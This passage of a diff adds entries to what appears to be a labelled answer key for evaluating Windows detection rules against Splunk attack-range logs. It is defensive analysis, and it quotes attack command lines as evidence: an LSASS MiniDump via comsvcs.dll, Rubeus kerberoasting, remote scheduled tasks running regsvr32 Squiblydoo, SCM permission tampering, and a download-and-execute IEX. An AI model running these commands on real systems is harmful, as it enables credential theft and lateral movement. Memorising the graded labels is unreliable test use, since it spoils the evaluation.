+     "reason": "Run value whose data points to a payload in C:\\ProgramData (a user-writable path) through rundll32/advpack LaunchINFSection; not a OneDrive/Teams filter case."
+    }
+   ]
+  },
+  {
+   "label": "H38",
+   "dataset": "splunk/T1558.003/atomic_red_team/windows-sysmon",
+   "sha256": "e3a1a1d540d28e4e8d5e59d0e3c505d1904ec44067127fd6bcfa963d20fab704",
+   "summary": "Sysmon-only export of exactly 10,000 records (likely capped) from win-dc-156 and win-host-374 around an Attack Range build and reboot: Ansible WinRM provisioning (winrshost -> cmd /C PowerShell -EncodedCommand, setup, win_reboot \"Reboot initiated by Ansible\"), Caldera agents (C:\\caldera_manx_agent.ps1 starting C:\\Users\\Public\\splunkd.exe; sandcat.exe dropped), Splunk forwarder. The mimikatz Kerberoasting is not visible: no mimikatz process, no Security 4769. LSASS EID 10 records exist but are all excluded (csrss/wininit by path, PowerShell 0x1410 with System.ni.dll) or lack VM_READ (svchost 0x1400).",
+   "labels": [
+    {
+     "detection": "T1558.003_kerberoasting_rc4_tgs",
+     "label": "telemetry",
+     "evidence": [
+      "File is Sysmon only (EIDs 1,3,4,6,10,11,12,13,16,22); no Security 4769",
+      "No mimikatz or other roasting process among the 502 Sysmon EID 1 records"
+     ],
+     "reason": "Kerberoasting with RC4 (per the description) is detected from 4769 on the DC; none is in the file."
+    },
+    {
+     "detection": "T1558.003_kerberoasting_volume",
+     "label": "telemetry",
+     "evidence": [
+      "File is Sysmon only; no Security 4769 to count per IpAddress"
+     ],
+     "reason": "The correlation counts distinct ServiceName per client in 4769 events; the file has none."
+    },
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "other",
+     "evidence": [
+      "EventRecordID 63 (win-dc-156): Sysmon 1, cmd.exe \"/C PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand <b64 len=2700>\", ParentImage C:\\Windows\\System32\\winrshost.exe",
+      "16 cmd.exe children of winrshost.exe: RIDs 63, 189, 315, 443, 482, 576, 2411, 2510 (win-dc-156) and 91, 238, 369, 497, 536, 630, 1841, 2133 (win-host-374)",
+      "Decoded payloads are nested Ansible wrappers: exec_wrapper/json_raw bootstrap (b64 len 928), Get-WmiObject Win32_* (168), whoami (16), win_reboot (528/1632) followed by shutdown.exe \"Reboot initiated by Ansible\" (RID 532)"
+     ],
+     "reason": "cmd.exe under winrshost.exe matches susp_shell, but every instance is Ansible's WinRM connection provisioning the range, not the attack; no documented filter excludes it."
+    },
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "other",
+     "evidence": [
+      "EventRecordID 76 (win-dc-156): Sysmon 1, powershell.exe \"-NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand <b64 len=2700>\", parent cmd.exe (child of winrshost.exe)",
+      "EventRecordID 96 (win-dc-156): Sysmon 1, powershell.exe \"... -EncodedCommand <b64 len=928>\" (Ansible exec_wrapper bootstrap), parent powershell.exe",
+      "24 encoded launches in total, all Ansible (b64 lengths 2700/928/168/1632/528/16)"
+     ],
+     "reason": "The launches match the encoded-command pattern, but they are Ansible WinRM transport; the attack has no encoded PowerShell in the file (the Caldera agent uses -ExecutionPolicy Bypass -C), and filter_sccm does not apply."
+    }
+   ]
+  },
+  {
+   "label": "H39",
+   "dataset": "splunk/T1558.003/atomic_red_team/windows-sysmon_setspn",
+   "sha256": "bfb8c159969b27160534564e99642c737dcf9839bd4e303c37edbc7ff8a102bd",
+   "summary": "Sysmon-only export from win-dc-469 and win-host-874: 26 setspn.exe runs from PowerShell enumerating SPNs (-T <domain> -Q */*, -F -Q MSSQLSvc/*) and registering smb/purplehaze.offense:445 on user \"atomic\". No Kerberos ticket events, no other in-scope behaviour.",
+   "labels": [
+    {
+     "detection": "T1558.003_kerberoasting_rc4_tgs",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 29763515: Sysmon 1, C:\\Windows\\System32\\setspn.exe \"-T attackrange.local -Q */*\", parent powershell.exe, win-dc-469",
+      "EventRecordID 29792881: Sysmon 1, setspn.exe \"-T attackrange.local -F -Q MSSQLSvc/*\"",
+      "EventRecordID 29784487: Sysmon 1, setspn.exe \"-s smb/purplehaze.offense:445 atomic\"",
+      "No Security 4769 in the file (Sysmon 1/3/5/7/10/12/22 only)"
+     ],
+     "reason": "Only the SPN discovery/registration part of the RC4 Kerberoasting run is visible; the ticket requests the rule reads (4769 on the DC) are not in the file."
+    },
+    {
+     "detection": "T1558.003_kerberoasting_volume",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 29763515: Sysmon 1, setspn.exe \"-T attackrange.local -Q */*\" (SPN enumeration)",
+      "No Security 4769 in the file"
+     ],
+     "reason": "The correlation counts 4769 service tickets per client; the file contains none."
+    }
+   ]
+  },
+  {
+   "label": "H40",
+   "dataset": "splunk/T1558.003/rubeus/windows-sysmon",
+   "sha256": "dcae856a516c000816cc825d35286105bd6b842df51eb87056c83a2abe76b811",
+   "summary": "Sysmon-only export from win-dc-128 and win-host-987: klist purge then \"Rubeus.exe kerberoast\" (C:\\Tools) on the DC against 30 SPN accounts; Sysinternals Process Explorer running on both hosts opens every process, including LSASS with 0x1fffff; Splunk forwarder restarts. No Security 4769.",
+   "labels": [
+    {
+     "detection": "T1558.003_kerberoasting_rc4_tgs",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 171890714: Sysmon 1, C:\\Tools\\Rubeus.exe \"Rubeus.exe kerberoast\", parent cmd.exe, ATTACKRANGE\\Administrator, win-dc-128",
+      "EventRecordIDs 171890173 / 171890039: Sysmon 1, klist.exe \"klist purge\"",
+      "No Security 4769 in the file (Sysmon only)"
+     ],
+     "reason": "Rubeus roasting produces a 4769 per SPN account on the DC; the rule reads 4769 and the file has none."
+    },
+    {
+     "detection": "T1558.003_kerberoasting_volume",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 171890714: Sysmon 1, Rubeus.exe \"kerberoast\" (30 SPN accounts per the description, well above 5 per 10 min)",
+      "No Security 4769 in the file"
+     ],
+     "reason": "Volume roasting is exactly what the correlation counts, but its input (4769 on the DC) is absent."
+    },
+    {
+     "detection": "T1003.001_lsass_memory_access",
+     "label": "other",
+     "evidence": [
+      "EventRecordID 171886004: Sysmon 10, C:\\Tools\\ProcessExplorer\\procexp64.exe -> C:\\Windows\\system32\\lsass.exe, GrantedAccess 0x1fffff, SourceUser ATTACKRANGE\\Administrator (win-dc-128)",
+      "EventRecordID 96101250: Sysmon 10, C:\\Users\\reed_schmidt\\Downloads\\ProcessExplorer\\procexp64.exe -> lsass.exe, GrantedAccess 0x1fffff (win-host-987)",
+      "112 such 0x1fffff LSASS records (54 + 58); the same procexp64 copies open every process (7,043 and 5,171 EID 10 records)"
+     ],
+     "reason": "A full-access LSASS handle from a source the rule does not exclude (only csrss, wininit, WMI provider host, the .NET Get-Process pattern and the Defender platform scanner are excluded), so an alert is expected; the source is Process Explorer used by the lab operator, an admin tool rather than the attack."
+    }
+   ]
+  },
+  {
+   "label": "H41",
+   "dataset": "splunk/T1569.002/atomic_red_team/windows-sysmon",
+   "sha256": "6864968926d7ef6b7fb97d6a5d8ee3478ca4c880d3f048a919f5a16d9e5d4982",
+   "summary": "Sysmon-only export, mainly win-dc-906 (2021-04-05): Ansible WinRM provisioning and Install-AtomicRedTeam, then Invoke-AtomicTest T1569.002 via Ansible win_shell - test 1 creates/starts/deletes ARTService (binPath cmd.exe /c powershell.exe -nop -w hidden New-Item C:\\art-marker.txt, run by services.exe as SYSTEM) and test 2 runs PsExec \\\\localhost; Caldera agents (sandcat.exe, C:\\Users\\Public\\splunkd.exe); plus a 2021-06-03 run on win-dc-233 of renamed PsExec C:\\Temp\\notps.exe (OriginalFileName psexec.c) starting wmic locally. LSASS EID 10 records are all excluded or lack VM_READ.",
+   "labels": [
+    {
+     "detection": "T1569.002_suspicious_service_installation",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 7441: Sysmon 1, sc.exe \"create ARTService binPath= \\\"C:\\Windows\\system32\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item...\\\"\", parent cmd.exe",
+      "EventRecordID 7457: Sysmon 13, services.exe sets HKLM\\System\\CurrentControlSet\\Services\\ARTService\\ImagePath = C:\\Windows\\system32\\cmd.exe /c powershell.exe -nop -w hidden ...",
+      "EventRecordID 7472: Sysmon 1, cmd.exe \"/c powershell.exe -nop -w hidden -command New-Item ...\" started by services.exe as SYSTEM",
+      "EventRecordID 7526: Sysmon 1, cmd.exe \"/c C:\\PSTools\\PsExec.exe \\\\localhost -u DOMAIN\\Administrator -p <redacted> -accepteula ...\"",
+      "No System 7045 or Security 4697 in the file (Sysmon only)"
+     ],
+     "reason": "The ARTService ImagePath contains \"cmd.exe /c\" and PowerShell (susp_path), so its 7045 would be in scope, but the file has no 7045/4697."
+    },
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "other",
+     "evidence": [
+      "EventRecordID 85: Sysmon 1, powershell.exe \"-NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand <b64 len=2700>\", parent cmd.exe (from winrshost.exe)",
+      "EventRecordID 7338: Sysmon 1, \"powershell.exe\" -noninteractive -encodedcommand <b64 len=720> (Ansible win_shell; decodes to Invoke-AtomicTest T1569.002), parent powershell.exe",
+      "EventRecordIDs 7060 (len 512, Invoke-AtomicTest -GetPrereqs), 7687 (len 504, -Cleanup), 6539 (len 1384, Install-AtomicRedTeam)",
+      "37 encoded launches in total, all Ansible WinRM bootstrap or win_shell wrappers"
+     ],
+     "reason": "All encoded launches are Ansible transport, including the win_shell call that starts Invoke-AtomicTest; the attack's own PowerShell (ARTService \"-nop -w hidden -command\") and the Caldera agent's \"-ExecutionPolicy Bypass -C\" commands are not encoded."
+    },
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "other",
+     "evidence": [
+      "EventRecordID 69: Sysmon 1, cmd.exe \"/C PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand <b64 len=2700>\", ParentImage C:\\Windows\\System32\\winrshost.exe (win-dc-906)",
+      "18 cmd.exe children of winrshost.exe, all Ansible WinRM (e.g. RIDs 279, 566, 7224, 7572)"
+     ],
+     "reason": "susp_shell under winrshost.exe, produced by Ansible's WinRM connection rather than the attack; no documented filter excludes it."
+    }
+   ]
+  },
+  {
+   "label": "H42",
+   "dataset": "splunk/T1569.002/remcom/4688_remcom_windows-security",
+   "sha256": "2811f674e503b48107fff94f6c51bd4cf4d885bd8aa1b2b44bdf0425d1a57e24",
+   "summary": "Atomic RemCom test on mswin-server (Security 4688): cmd.exe -> remcom.exe \\\\localhost /user:Administrator /pwd:... cmd.exe -> %TEMP%\\ProcComs.bin, plus Invoke-AtomicTest prerequisite check and download of remcom.exe.",
+   "labels": [
+    {
+     "detection": "T1569.002_suspicious_service_installation",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 717199: Security 4688, C:\\AtomicRedTeam\\atomics\\T1569.002\\bin\\remcom.exe \"\\\\localhost /user:Administrator /pwd:<redacted> cmd.exe\", parent cmd.exe",
+      "EventRecordID 717200: Security 4688, C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\ProcComs.bin \"Administrator <redacted> cmd.exe\", parent remcom.exe",
+      "No System 7045 or Security 4697 in the file (Security 4688 only)"
+     ],
+     "reason": "RemCom installs its RemComSvc service on the target (susp_name lists RemCom), but the rule reads 7045/4697 and the file has neither."
+    }
+   ]
+  },
+  {
+   "label": "H43",
+   "dataset": "splunk/T1569.002/remcom/remcom_windows-sysmon",
+   "sha256": "111cefde6d681ec4b881ec42873bd79e8473676f0934859b220109806d44ecfb",
+   "summary": "Eleven RemCom (C:\\AtomicRedTeam\\atomics\\T1569.002\\bin\\remcom.exe) launches on mswin-server against \\\\localhost and \\\\127.0.0.1 with various credential syntaxes to run calc.exe (Sysmon 1 only).",
+   "labels": [
+    {
+     "detection": "T1569.002_suspicious_service_installation",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 28618366: Sysmon 1, remcom.exe \"\\\\localhost -u Administrator -p <redacted> C:\\Windows\\System32\\calc.exe\", parent cmd.exe",
+      "EventRecordID 28624177: Sysmon 1, remcom.exe \"\\\\127.0.0.1 /user:Administrator /pwd:<redacted> calc.exe\", parent powershell.exe (11 launches 20:24-20:30)",
+      "No System 7045 or Security 4697 in the file"
+     ],
+     "reason": "RemCom service execution would install the RemComSvc service (susp_name), but the file has no 7045/4697."
+    }
+   ]
+  },
+  {
+   "label": "H44",
+   "dataset": "splunk/T1569.002/scmanager_sddl_tamper/scmanager_sddl_tamper_sysmon",
+   "sha256": "1de36fdd7b94b387f3bda47a6df391550e440f195cc61c905167d70e9172855c",
+   "summary": "Single Sysmon 1 on ar-win: sc.exe sdset scmanager D:(A;;KA;;;WD) run through cmd.exe /c by NAS\\Administrator (High integrity), granting Everyone full control of the Service Control Manager.",
+   "labels": [
+    {
+     "detection": "T1569.002_suspicious_service_installation",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 239955: Sysmon 1, C:\\Windows\\System32\\sc.exe \"sdset scmanager D:(A;;KA;;;WD)\", parent cmd.exe /c, NAS\\Administrator"
+     ],
+     "reason": "Rewriting the SCM security descriptor installs no service; the rule keys on new-service fingerprints in 7045/4697 (ImagePath, service name), so SCM permission tampering is outside its scope (and the file has no 7045 anyway)."
+    }
+   ]
+  },
+  {
+   "label": "H45",
+   "dataset": "splunk/T1003.001/atomic_red_team/windows-security.log",
+   "sha256": "962debff1935335a6c6396a19d778127af1316b964226ba4427fae4fb9c9361b",
+   "summary": "Atomic T1003.001 on win-dc-811 (4 Security 4688 events): an Invoke-AtomicTest PowerShell runs rundll32 comsvcs.dll MiniDump against LSASS (PID 840) into %TEMP%\\lsass-comsvcs.dmp, twice (01:32:54 and 01:40:45 PM).",
+   "labels": [
+    {
+     "detection": "T1218.011_rundll32_suspicious_execution",
+     "label": "attack",
+     "evidence": [
+      "RecordNumber 258296: 4688 win-dc-811, Creator Process Name ...\\powershell.exe, New Process Name C:\\Windows\\System32\\rundll32.exe, Process Command Line \"...\\rundll32.exe\" ...\\comsvcs.dll MiniDump 840 C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\lsass-comsvcs.dmp full",
+      "RecordNumber 257146: 4688, same rundll32.exe comsvcs.dll MiniDump 840 ...\\AppData\\Local\\Temp\\lsass-comsvcs.dmp full (first run, 01:32:54 PM)"
+     ],
+     "reason": "rundll32 image with comsvcs.dll MiniDump (susp_minidump), plus an AppData path in the command line (susp_path); this rule accepts 4688."
+    },
+    {
+     "detection": "T1003.001_lsass_memory_access",
+     "label": "telemetry",
+     "evidence": [
+      "RecordNumber 258296 / 257146: 4688 rundll32.exe C:\\windows\\System32\\comsvcs.dll MiniDump 840 ...lsass-comsvcs.dmp full",
+      "RecordNumber 258294: 4688 powershell.exe & {... comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full}",
+      "The file holds only Security 4688 events (4); there is no Sysmon EID 10"
+     ],
+     "reason": "LSASS was dumped, but the detection reads Sysmon 10 ProcessAccess with TargetImage lsass.exe, which the file lacks."
+    }
+   ]
+  },
+  {
+   "label": "H46",
+   "dataset": "splunk/T1003.001/atomic_red_team/windows-system.log",
+   "sha256": "4ac7ed133d6a44788d841735605aa70644897749201d5a9b7afdc93f2d9518e7",
+   "summary": "System log from the Nov 2020 Atomic T1003.001 run (4 host names, mostly the Attack Range build: DC promotion services, Splunk, nxlog and Sysmon installs). At 03:52:58 PM the Windows Credential Editor service WCESERVICE is installed from the Administrator's Temp folder.",
+   "labels": [
+    {
+     "detection": "T1569.002_suspicious_service_installation",
+     "label": "attack",
+     "evidence": [
+      "RecordNumber 82203: 7045 win-dc-807.attackrange.local, Service Name WCESERVICE, Service File Name C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\644c305e-30f4-470b-b616-d924c3206d1d.exe -S, demand start, LocalSystem",
+      "The other 20 7045 events are lab services (DNS Server, AD DS, DFS, Splunk drivers/forwarder, nxlog, SysmonDrv/sysmon64 e.g. RecordNumber 82019, npf 82207); none matches a susp_* selection"
+     ],
+     "reason": "The credential-dumping tool (WCE) installs a service whose ImagePath is under AppData\\Local\\Temp (susp_writable_path) and is read from System 7045."
+    },
+    {
+     "detection": "T1003.001_lsass_memory_access",
+     "label": "telemetry",
+     "evidence": [
+      "RecordNumber 82203: 7045 WCESERVICE ...\\AppData\\Local\\Temp\\<guid>.exe -S (WCE, which opens LSASS to read credentials)",
+      "System log only (1057 events); no Sysmon EID 10"
+     ],
+     "reason": "WCE accesses LSASS memory, but the detection reads Sysmon 10 ProcessAccess, which a System log cannot contain."
+    }
+   ]
+  },
+  {
+   "label": "H47",
+   "dataset": "splunk/T1021.006/lateral_movement/windows-security.log",
+   "sha256": "dd8c5e27b2e629972bc0339fb6eea1bf8667d14dc2a1110555a4bec366de9448",
+   "summary": "winrs lateral movement from win-dc-128 to win-host-987 (Security): winrs -r:win-host-987 \"ipconfig\" and \"netstat -an\"; on the target winrshost.exe starts cmd.exe /C ipconfig and cmd.exe /C netstat -an. The rest is Splunk forwarder modules, WFP 5156/5158 and logons; the single 4769 is an AES ticket for WIN-HOST-987$.",
+   "labels": [
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "telemetry",
+     "evidence": [
+      "RecordNumber 3702908: 4688 win-host-987, Creator Process Name C:\\Windows\\System32\\winrshost.exe, New Process Name C:\\Windows\\System32\\cmd.exe, Process Command Line C:\\Windows\\system32\\cmd.exe /C \"ipconfig\"",
+      "RecordNumber 3702920: 4688 win-host-987, parent winrshost.exe, cmd.exe /C \"netstat -an\"",
+      "RecordNumber 1512111036 / 1512111050: 4688 win-dc-128, winrs  -r:win-host-987.attackrange.local \"ipconfig\" / \"netstat -an\""
+     ],
+     "reason": "cmd.exe under winrshost.exe is the susp_shell selection, but this rule's telemetry section names only Sysmon EID 1 (unlike the other process rules it does not allow a 4688 remapping), and the file holds only Security 4688."
+    }
+   ]
+  },
+  {
+   "label": "H48",
+   "dataset": "splunk/T1021.006/lateral_movement_lolbas/windows-security.log",
+   "sha256": "d0eb2de4d141d8fdabb7d454303f3c7224be29442bcb6b41a64beca5708b3191",
+   "summary": "WinRM LOLBAS lateral movement from win-dc-128 to win-host-987 (Security): winrs runs cmd.exe /C \"rundll32.exe C:\\evil.dll\" and cmd.exe /C ipconfig under winrshost.exe, and a PowerShell remoting session (wsmprovhost.exe) starts rundll32.exe C:\\evil.dll. The rest is Splunk and WFP noise.",
+   "labels": [
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "telemetry",
+     "evidence": [
+      "RecordNumber 3966096: 4688 win-host-987, parent C:\\Windows\\System32\\winrshost.exe, New Process Name cmd.exe, Process Command Line C:\\Windows\\system32\\cmd.exe /C \"C:\\Windows\\System32\\rundll32.exe C:\\evil.dll\"",
+      "RecordNumber 3966172: 4688 win-host-987, parent C:\\Windows\\System32\\wsmprovhost.exe, New Process Name C:\\Windows\\System32\\rundll32.exe, Process Command Line \"C:\\Windows\\System32\\rundll32.exe\" C:\\evil.dll",
+      "RecordNumber 3966139: 4688 win-host-987, parent winrshost.exe, cmd.exe /C \"ipconfig\"",
+      "RecordNumber 1513296520: 4688 win-dc-128, winrs  -r:win-host-987.attackrange.local \"C:\\Windows\\System32\\rundll32.exe C:\\evil.dll\""
+     ],
+     "reason": "cmd.exe (susp_shell) and rundll32 (susp_proxy) started by WinRM hosts are in scope, but the rule reads Sysmon EID 1 only and the file holds only Security 4688."
+    },
+    {
+     "detection": "T1218.011_rundll32_suspicious_execution",
+     "label": "scope",
+     "evidence": [
+      "RecordNumber 3966097: 4688 win-host-987, parent cmd.exe, New Process Name C:\\Windows\\System32\\rundll32.exe, Process Command Line C:\\Windows\\System32\\rundll32.exe  C:\\evil.dll",
+      "RecordNumber 3966172: 4688 win-host-987, parent wsmprovhost.exe, \"C:\\Windows\\System32\\rundll32.exe\" C:\\evil.dll"
+     ],
+     "reason": "rundll32 loads a DLL from the root of C:\\. That is not javascript:/RunHTMLApplication, not an AppData/ProgramData/Users\\Public/Windows\\Temp/Downloads path, and not comsvcs MiniDump, and the call has an argument (not no-args), so none of the four susp_* patterns applies."
+    }
+   ]
+  },
+  {
+   "label": "H49",
+   "dataset": "splunk/T1021.006/lateral_movement_psh/windows-security.log",
+   "sha256": "451355037496a9194541de356beba7cbfb33d2c6d8ae5dc199f7c4183aee8c10",
+   "summary": "PowerShell remoting lateral movement (Security): on win-dc-128, cmd /c powershell.exe Invoke-Command -ComputerName win-host-987 -ScriptBlock {ipconfig}; on win-host-987, wsmprovhost.exe starts ipconfig.exe. The rest is Splunk and WFP noise.",
+   "labels": [
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "scope",
+     "evidence": [
+      "RecordNumber 3789511: 4688 win-host-987, Creator Process Name C:\\Windows\\System32\\wsmprovhost.exe, New Process Name C:\\Windows\\System32\\ipconfig.exe, Process Command Line \"C:\\Windows\\system32\\ipconfig.exe\"",
+      "RecordNumber 1512543620: 4688 win-dc-128, powershell.exe  Invoke-Command -ComputerName win-host-987.attackrange.local -ScriptBlock {ipconfig}"
+     ],
+     "reason": "The only WinRM-host child is ipconfig.exe, which is not cmd.exe, encoded PowerShell or one of the listed proxy binaries (rundll32/regsvr32/mshta/certutil/bitsadmin). The file also lacks the Sysmon EID 1 the rule reads (it has only 4688)."
+    }
+   ]
+  },
+  {
+   "label": "H50",
+   "dataset": "splunk/T1053.005/atomic_red_team/windows-security.log",
+   "sha256": "e0726abafdb7f4951d0a9c0e4ad51aad38c9841feb6a51a12b3131d321077a1f",
+   "summary": "Atomic T1053.005 run on win-host-5 (Security): schtasks /create with \"cmd.exe /c calc.exe\" actions (OnLogon; OnStartup as SYSTEM), a local task with a bare cmd.exe action, a /S localhost task as DOMAIN\\user, a PowerShell New-ScheduledTaskAction/Register-ScheduledTask task, and an Invoke-MalDoc VBA test (no Word process, no task). 4698 confirms four tasks. The rest is RDP logons, Splunk, WFP and one AES 4769 for WIN-DC-982$.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "attack",
+     "evidence": [
+      "RecordNumber 278921: 4688 win-host-5, New Process Name C:\\Windows\\System32\\schtasks.exe, Process Command Line schtasks  /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"",
+      "RecordNumber 278918: 4688, schtasks  /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"",
+      "RecordNumber 278922 / 278919: 4698 \\T1053_005_OnStartup (UserId S-1-5-18) / \\T1053_005_OnLogon, Exec cmd.exe /c calc.exe",
+      "Out of scope: RecordNumber 278926 SCHTASKS  /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10; RecordNumber 278932 SCHTASKS  /Create /S localhost /RU DOMAIN\\user /RP [REDACTED] /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" ..."
+     ],
+     "reason": "schtasks.exe /create with a \"cmd /c\" action is the susp_action selection; this rule accepts 4688. The spawn task (bare cmd.exe, no /c) and the /S localhost task run as DOMAIN\\user (not SYSTEM) match no susp_* selection."
+    },
+    {
+     "detection": "T1053.005_powershell_scheduled_task_creation",
+     "label": "attack",
+     "evidence": [
+      "RecordNumber 278945: 4688 win-host-5, New Process Name ...\\powershell.exe, Process Command Line (len 442) \"...powershell.exe\" & {$Action = New-ScheduledTaskAction -Execute \\\"\"calc.exe\\\"\" ... Register-ScheduledTask AtomicTask ...}",
+      "RecordNumber 278949: 4698 \\AtomicTask, Exec calc.exe, LogonTrigger",
+      "RecordNumber 278951: 4688 powershell.exe & {IEX (iwr \\\"\"https://raw.githubusercontent.com/.../Invoke-MalDoc.ps1\\\"\" ...) Invoke-MalDoc ... -sub \\\"\"Scheduler\\\"\"} (VBA test; no Register-ScheduledTask, no task created)"
+     ],
+     "reason": "Register-ScheduledTask on the command line together with an inline New-ScheduledTaskAction -Execute (susp_action); this rule accepts 4688. The VBA test (COM Schedule.Service, a documented gap) created no task."
+    }
+   ]
+  },
+  {
+   "label": "H51",
+   "dataset": "splunk/T1053.005/atomic_red_team/windows-system.log",
+   "sha256": "7c8556b7fec2e3e6eb77e498254fe527e5e53435da9a8be508513b15aee41654",
+   "summary": "System log (Dec 7 2020, 12:00-12:37 PM) from the T1053.005 atomic_red_team folder. It shows only the Attack Range build (Ansible reboots, DC promotion services, Splunk/Sysmon/npf installs); no attack activity is visible, there are no 104 events, and no 7045 matches a suspicious-service selection.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "telemetry",
+     "evidence": [
+      "1037 System events (7036, 7045, 7040, kernel/boot, DCOM, time service, ...); no process-creation events",
+      "19 x 7045 are lab services, e.g. RecordNumber 83534 DNS Server (%systemroot%\\system32\\dns.exe), 83808 sysmon64 (C:\\Windows\\sysmon64.exe), 84000 npf",
+      "RecordNumber 83812: 1074 shutdown.exe restart \"Reboot initiated by Ansible\""
+     ],
+     "reason": "The atomic schtasks /create tests are visible only in process creation (Sysmon 1 / 4688), which a System log does not contain."
+    },
+    {
+     "detection": "T1053.005_powershell_scheduled_task_creation",
+     "label": "telemetry",
+     "evidence": [
+      "1037 System events; no process-creation (Sysmon 1 / 4688) or script-block (4104) events"
+     ],
+     "reason": "The atomic Register-ScheduledTask/New-ScheduledTaskAction test needs Sysmon 1, 4688 or 4104, none of which a System log contains."
+    }
+   ]
+  },
+  {
+   "label": "H52",
+   "dataset": "splunk/T1053.005/lateral_movement/windows-security.log",
+   "sha256": "f2cc79c1561b2767620d50d1e857321b76f1f9c55fc9d8ca891371ce9c7a9455",
+   "summary": "Remote scheduled-task lateral movement from win-dc-128 to 10.0.1.15 / win-host-987 (Security): schtasks /S 10.0.1.15 /create /tn evilTask /tr C:\\metE.exe /ru system, then /run and /delete. The target logs 4698/4699 and C:\\metE.exe started by svchost. Also sc \\\\10.0.1.15 delete maliciousService (cleanup; no service creation in the file).",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "attack",
+     "evidence": [
+      "RecordNumber 1512107498: 4688 win-dc-128, New Process Name C:\\Windows\\System32\\schtasks.exe, Process Command Line Schtasks  /S 10.0.1.15 /create /tn evilTask /tr C:\\metE.exe /ru system /sc once /st 00:00",
+      "RecordNumber 3702190: 4698 win-host-987 \\evilTask, UserId S-1-5-18, Exec C:\\metE.exe; RecordNumber 3702194: 4688 svchost.exe -> C:\\metE.exe"
+     ],
+     "reason": "/create with a remote /s <host> and /ru system is the susp_system_remote selection; this rule accepts 4688."
+    }
+   ]
+  },
+  {
+   "label": "H53",
+   "dataset": "splunk/T1053.005/lateral_movement_lolbas/windows-security.log",
+   "sha256": "b7ec97db6e42b62ef2fa5a52bae36ce68bdc8a535d52032e6a240b32386eab48",
+   "summary": "Remote scheduled-task lateral movement with a LOLBAS action (Security): schtasks /S 10.0.1.15 /create /tn evilTask /tr \"C:\\Windows/system32/regsvr32.exe /u /n /s /i:evil.sct scrobj.dll\" /ru system, then /run and /delete. The target logs 4698/4699 and regsvr32 (Squiblydoo) started by svchost.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "attack",
+     "evidence": [
+      "RecordNumber 1513299840: 4688 win-dc-128, New Process Name C:\\Windows\\System32\\schtasks.exe, Process Command Line Schtasks  /S 10.0.1.15 /create /tn evilTask /tr \"...regsvr32.exe /u /n /s /i:evil.sct scrobj.dll\" /ru system ...",
+      "RecordNumber 3966853: 4698 win-host-987 \\evilTask, UserId S-1-5-18, Exec C:\\Windows/system32/regsvr32.exe /u /n /s /i:evil.sct scrobj.dll; RecordNumber 3966857: 4688 svchost.exe -> regsvr32.exe"
+     ],
+     "reason": "regsvr32 in the action (susp_action) and remote /s <host> with /ru system (susp_system_remote); this rule accepts 4688."
+    }
+   ]
+  },
+  {
+   "label": "H54",
+   "dataset": "splunk/T1053.005/schtask_shutdown/windows-security.log",
+   "sha256": "c4d1c1c2e2cbbbac3c4bbf947fb2a1d4023521aef6429268da10d6e83761f248",
+   "summary": "Large Security log (Dec 8 2020, 4 host names) from the schtask_shutdown folder: Attack Range build traffic (DC promotion, account and group changes, logons, reboots). No schtasks.exe execution and no 4698 are recorded; the 61 4688 events are boot processes with empty command lines. All 412 4769 are AES (0x12) for WIN-DC-431$/krbtgt from ::1, all 398 4768 succeed, and the two 4625 (local Administrator, wrong password) have no remote address.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "telemetry",
+     "evidence": [
+      "61 x 4688, all boot-time processes (autochk/smss/csrss/wininit/winlogon/lsass/services, e.g. RecordNumber 231333 autochk.exe, 235907 smss.exe) with an empty Process Command Line",
+      "No schtasks.exe 4688 and no 4698 among the 4846 events"
+     ],
+     "reason": "The task created by the schtask_shutdown scenario is not in this log. The file has no command-line process creation covering it, and the detection reads only process creation (Sysmon 1 / 4688)."
+    }
+   ]
+  },
+  {
+   "label": "H55",
+   "dataset": "splunk/T1053.005/schtask_shutdown/windows-system.log",
+   "sha256": "dab50bd527c2a577954dd188f25b66003d654af7e1533b6f787bdcd757cf9e77",
+   "summary": "System log (Dec 8 2020) from the schtask_shutdown folder: the lab build (Ansible-initiated reboots through shutdown.exe, DC promotion services, Splunk/Sysmon/npf installs). No attack activity is visible, there are no 104 events, and all 19 7045 are lab services.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "telemetry",
+     "evidence": [
+      "1052 System events; no process-creation events",
